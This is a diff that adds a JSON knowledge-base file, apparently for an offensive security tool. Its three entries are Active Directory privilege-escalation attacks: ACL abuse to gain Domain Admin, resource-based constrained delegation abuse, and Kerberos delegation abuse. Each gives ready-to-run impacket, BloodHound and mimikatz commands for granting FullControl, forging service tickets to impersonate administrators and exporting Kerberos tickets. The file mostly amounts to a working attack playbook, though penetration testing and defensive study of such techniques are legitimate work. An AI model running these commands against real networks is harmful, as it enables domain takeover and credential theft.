@@ -1,0 +1,56 @@
+[
+  {
+    "id": "ad-pe-001",
+    "category": "windows_ad",
+    "subcategory": "privilege_escalation",
+    "title": "ACL Abuse — Add Domain Admin",
+    "description": "Exploit misconfigured ACLs (WriteDacl, GenericWrite, GenericAll) on domain objects to grant DCSync or Domain Admin privileges to a controlled account.",
+    "techniques": [
+      "bloodhound-python -d <DOMAIN> -u <USER> -p <PASS> -c ACL --collect All",
+      "impacket-dacledit <DOMAIN>/<USER>:<PASS> -action write -principal <CONTROLLED_USER> -target-dn '<TARGET_DN>' -rights FullControl",
+      "net rpc rights grant '<DOMAIN>\\<USER>' SeEnableDelegationPrivilege -S <DC_IP>"
+    ],
+    "indicators": ["BloodHound shows ACL attack paths", "GenericWrite/WriteDacl on high-value objects"],
+    "prerequisites": ["Domain credentials with ACL write rights", "BloodHound data collected"],
+    "tools": ["impacket-dacledit", "bloodhound", "powerview"],
+    "tags": ["acl", "abuse", "generic-write", "dacl", "privilege-escalation", "domain-admin"],
+    "confidence": 0.85,
+    "mitre_attack": "T1484"
+  },
+  {
+    "id": "ad-pe-002",
+    "category": "windows_ad",
+    "subcategory": "privilege_escalation",
+    "title": "Resource-Based Constrained Delegation (RBCD) Abuse",
+    "description": "Exploit RBCD to impersonate any user to a target machine. If a controlled account has write access to msDS-AllowedToActOnBehalfOfOtherIdentity on a target computer, full compromise is possible.",
+    "techniques": [
+      "impacket-findDelegation <DOMAIN>/<USER>:<PASS>",
+      "impacket-rbcd <DOMAIN>/<USER>:<PASS> -delegate-from <CONTROLLED_ACCOUNT> -delegate-to <TARGET_COMPUTER>$ -action write",
+      "impacket-getST -spn cifs/<TARGET_COMPUTER> -impersonate administrator <DOMAIN>/<CONTROLLED_ACCOUNT>$:<HASH>"
+    ],
+    "indicators": ["GenericWrite/WriteProperty on computer object", "No privileged users on target machine session"],
+    "prerequisites": ["Write access to target computer AD object", "Controlled machine account or user"],
+    "tools": ["impacket-rbcd", "impacket-getST", "impacket-findDelegation"],
+    "tags": ["rbcd", "delegation", "impersonation", "privilege-escalation", "kerberos"],
+    "confidence": 0.85,
+    "mitre_attack": "T1558.005"
+  },
+  {
+    "id": "ad-pe-003",
+    "category": "windows_ad",
+    "subcategory": "privilege_escalation",
+    "title": "Kerberos Delegation Abuse (Unconstrained/Constrained)",
+    "description": "Compromise a computer with unconstrained delegation to capture TGTs from privileged users. With constrained delegation, impersonate users to specific services.",
+    "techniques": [
+      "impacket-findDelegation <DOMAIN>/<USER>:<PASS>",
+      "mimikatz 'sekurlsa::tickets /export'",
+      "impacket-getST -spn <SERVICE>/<TARGET> -impersonate <USER> <DOMAIN>/<COMPROMISED_ACCOUNT>$:<HASH>"
+    ],
+    "indicators": ["Domain computers with unconstrained delegation", "DA access to delegation-configured machines"],
+    "prerequisites": ["Local admin on machine with delegation configured", "Domain enumeration data"],
+    "tools": ["impacket-getST", "mimikatz", "rubeus"],
+    "tags": ["kerberos", "delegation", "ticket", "impersonation", "privilege-escalation"],
+    "confidence": 0.85,
+    "mitre_attack": "T1558.001"
+  }
+]
